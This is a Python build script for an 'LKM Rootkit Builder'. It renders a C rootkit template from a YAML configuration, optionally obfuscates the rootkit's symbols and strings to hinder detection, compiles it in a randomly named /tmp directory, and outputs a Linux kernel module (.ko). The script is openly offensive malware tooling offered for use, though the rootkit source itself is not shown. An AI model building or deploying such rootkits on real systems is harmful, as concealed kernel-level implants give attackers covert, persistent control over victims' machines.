#!/usr/bin/env python3

import os
import sys
import yaml
import shutil
import argparse
import secrets
import obfuscator

import logging as log

from jinja2 import Template
from pprint import pformat

obfuscated = False

obFilesAndFunctions = obfuscator.FilesAndFunctions()
obStrings = obfuscator.Strings()

parser = argparse.ArgumentParser(description='Generate rootkit from yaml prescription')
parser.add_argument('-c', '--config', type=str, default="config.yml", help='Yaml prescription file', required=True)
parser.add_argument('-v', '--verbose', help='Debug Mode', action='store_true')
parser.add_argument('-o', '--obfuscate_files', help='Enable rootkit symbols obfuscation', action='store_true')
parser.add_argument('-s', '--obfuscate_strings', help='Enable rootkit strings obfuscation', action='store_true')
args = parser.parse_args()

if args.verbose:
    log.basicConfig(format="%(levelname)s: %(message)s", level=log.DEBUG)
else:
    log.basicConfig(format="%(levelname)s: %(message)s")

print("""
 ████   ████████   ████████  ██████████ █████       ███   █████
░░███  ███░░░░███ ███░░░░███░███░░░░███░░███       ░░░   ░░███
 ░███ ░░░    ░███░░░    ░███░░░    ███  ░███ █████ ████  ███████
 ░███    ██████░    ██████░       ███   ░███░░███ ░░███ ░░░███░
 ░███   ░░░░░░███  ░░░░░░███     ███    ░██████░   ░███   ░███
 ░███  ███   ░███ ███   ░███    ███     ░███░░███  ░███   ░███ ███
 █████░░████████ ░░████████    ███      ████ █████ █████  ░░█████
░░░░░  ░░░░░░░░   ░░░░░░░░    ░░░      ░░░░ ░░░░░ ░░░░░    ░░░░░
LKM Rootkit Builder
""")

log.info("v: Reading config "+args.config)
try:
    with open(args.config, 'r') as file:
        try:
            log.info("v: YAML Parsing file "+args.config)
            rootkit = yaml.safe_load(file)
        except:
            log.error("YAML parsing of file "+args.config+" failed")

except FileNotFoundError:
    log.error("Configuration file "+args.config+" not found")
    sys.exit(-1)

log.info("v: Reading rootkit template")
with open("rootkit_files/rootkit_template.j2", "r") as f:
    template = f.read()

if args.obfuscate_strings:
    obStrings.setAdditional(rootkit)
    obStrings.start()

rootkit.update(obStrings.getStrings())
if args.verbose:
    log.info("v: Settings")
    log.info(pformat(rootkit))

if "module" not in rootkit.keys():
    rootkit["module"] = {}
    rootkit["module"]["author"] = "default"
    rootkit["module"]["description"] = "default"
    rootkit["module"]["version"] = "1.0"
else:
    if "author" not in rootkit["module"].keys():
        rootkit["module"]["author"] = "default"
    if "description" not in rootkit["module"].keys():
        rootkit["module"]["description"] = "default"
    if "version" not in rootkit["module"].keys():
        rootkit["module"]["version"] = "1.0"

tm = Template(template)
log.info("v: Rendering rootkit template")
msg = tm.render(rootkit)

build_directory = obFilesAndFunctions.random_string()
original_directory = os.getcwd()

log.info("v: Copying rootkit data to /tmp/"+build_directory)
os.system("cp -r . /tmp/"+build_directory)
log.info("v: Changing working directory to /tmp/"+build_directory)
os.chdir("/tmp/"+build_directory)

with open("rootkit/main.c", "w") as f:
    if args.obfuscate_strings:
        log.info("v: Starting strings obfuscation")
        msg = obStrings.rewrite(msg)
        log.info("v: Strings obfuscation ended")
    f.write(msg)

log.info("v: Moving Makefile to .")
os.system("mv rootkit_files/Makefile .")

if args.obfuscate_files:
    log.info("v: Starting Files and Functions obfuscation")
    obFilesAndFunctions.start()
    log.info("v: Files and Functions obfuscation ended")
    obfuscated = True

error = False

log.info("v: Building rootkit")
s = os.system("make")
if os.WIFEXITED(s):
    status = os.WEXITSTATUS(s)
    if status:
        log.error("=== Make returned status code "+str(status)+" ===")
        error = True
    else:
        log.info("v: Make returned status code "+str(status))

rootkit_name = "project"
if obfuscated:
    rootkit_name = obFilesAndFunctions.get_name()

if not error:
    os.system("mv /tmp/"+build_directory+"/"+rootkit_name+".ko "+original_directory)

if args.verbose:
    log.info("v: Build with source code in "+build_directory)
else:
    shutil.rmtree("/tmp/"+build_directory)

if not error:
    print("\n=== File "+original_directory+"/"+rootkit_name+".ko created ===\n")
